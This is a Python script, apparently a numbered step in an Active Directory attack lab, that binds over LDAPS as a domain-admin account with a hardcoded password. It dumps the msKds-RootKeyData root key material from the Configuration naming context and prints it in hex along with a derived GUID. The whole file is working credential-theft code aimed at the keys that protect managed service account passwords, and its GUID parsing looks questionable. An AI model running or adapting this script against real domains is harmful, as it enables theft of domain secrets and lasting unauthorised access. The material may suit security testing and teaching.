# WT097 - KDS Root Key Extraction (DA) - ws01 native
# Chain: LDAPS bind as chief_command (DA) -> enumerate KDS root keys in the
#        Configuration NC -> read msKds-RootKeyData blob -> parse key GUID
# Success marker: root key BLOB recovered (key material) + RootKeyId GUID
import sys
from ldap3 import Server, Connection, NTLM, ALL

server = Server('192.168.77.10', port=636, use_ssl=True, get_info=ALL)
conn = Connection(server, user='cadre.local\\chief_command', password='C0mm@nd_Ch1ef!', authentication=NTLM, auto_bind=True)
print('LDAPS_BIND_OK')

base = 'CN=Master Root Keys,CN=Group Key Distribution Service,CN=Services,CN=Configuration,DC=cadre,DC=local'
conn.search(base, '(objectClass=*)', attributes=['*'])
print('ENTRIES', len(conn.entries))
for e in conn.entries:
    print('DN', e.entry_dn)
    key_attr = next((a for a in e.entry_attributes if a.lower() == 'mskds-rootkeydata'), None)
    if key_attr is None:
        print('  (container - no root key data)')
        continue
    blob = e[key_attr].value
    if isinstance(blob, bytes):
        print('ROOTKEY_BLOB_LEN', len(blob))
        print('ROOTKEY_HEX', blob.hex().upper()[:128] + ('...' if len(blob) > 64 else ''))
        if len(blob) >= 16:
            b = blob[:16]
            guid = '%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X' % (
                int.from_bytes(b[0:4], 'big'),
                int.from_bytes(b[4:6], 'big'),
                int.from_bytes(b[6:8], 'big'),
                b[8], b[9], b[10], b[11], b[12], b[13], b[14], b[15])
            print('ROOTKEY_GUID', guid)
    for attr in e.entry_attributes:
        if attr.lower() != 'mskds-rootkeydata':
            print(attr, e[attr].value)
conn.unbind()
print('WT097_DONE')
